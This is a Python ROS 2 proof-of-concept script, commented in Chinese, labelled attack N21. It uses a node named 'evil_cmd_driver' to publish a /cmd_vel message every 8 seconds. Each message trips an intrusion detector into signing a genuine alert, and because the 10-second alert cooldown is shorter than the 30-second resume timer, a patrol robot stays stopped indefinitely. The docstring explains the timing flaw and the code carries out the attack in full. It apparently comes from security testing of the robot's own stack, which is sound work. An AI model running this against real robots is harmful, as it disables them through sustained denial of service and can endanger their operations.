#!/usr/bin/env python3
"""攻擊 N21 — IDS 偵測器誘發式持續 DoS（偵測器當遠端停車按鈕）.

原理（與 N13 同類，但走 IDS 而非 system_status）：
    IDS 的 detector 一旦觸發（D1 物理超標 / D4 未授權 publisher），
    會「自己用密鑰簽一個真 CH_ALERTS 警報」廣播 → patrol 收到 → 停車 30s。

    關鍵時間差：
        IDS ALERT_COOLDOWN_SEC = 10s（兩次 alert 最少間隔）
        patrol resume timer    = 30s（停車後多久恢復）
    因為 10s < 30s → 攻擊者只要每 ~10s 戳一次 IDS，patrol 的 30s 恢復計時器
    永遠被新 alert 重置 → 永久停車。

    攻擊者「沒有密鑰」，只是發一筆 /cmd_vel（從未授權的 node 名）：
        D4 看到「/cmd_vel 有未授權 publisher」→ 觸發 → IDS 簽 alert。
    等於用「未授權的原始輸入」誘使「有密鑰的 IDS」替攻擊者拉警報。

本 PoC：用未授權 node 名，每 8 秒發一筆 /cmd_vel，持續戳 IDS。
觀察 patrol 是否永久停車（永遠不 resume）。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped


class DetectorTrigger(Node):

    def __init__(self):
        # 故意取一個「不在 CMD_ALLOWED 白名單」的名字 → 觸發 D4 未授權 publisher
        super().__init__('evil_cmd_driver')
        self._pub = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        self._n = 0
        # 每 8s 戳一次（< IDS 10s cooldown 的容忍，且 < patrol 30s resume）
        self.create_timer(8.0, self._poke)
        self.get_logger().error(
            '☠️ N21: 用未授權 node 名 evil_cmd_driver 每 8s 發一筆 /cmd_vel '
            '→ 誘使 IDS 簽警報 → patrol 永久停車'
        )
        # 開場先戳一次
        self._poke()

    def _poke(self):
        self._n += 1
        m = TwistStamped()
        m.header.stamp = self.get_clock().now().to_msg()
        m.header.frame_id = 'base_link'
        # 不需要極端值；光是「未授權 publisher」D4 就會觸發。給個正常值即可。
        m.twist.linear.x = 0.10
        self._pub.publish(m)
        self.get_logger().warn(f'  [poke #{self._n}] 發 /cmd_vel（戳 IDS D4）')


def main():
    rclpy.init()
    node = DetectorTrigger()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 40.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error(f'⏹ 結束，共戳 {node._n} 次')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
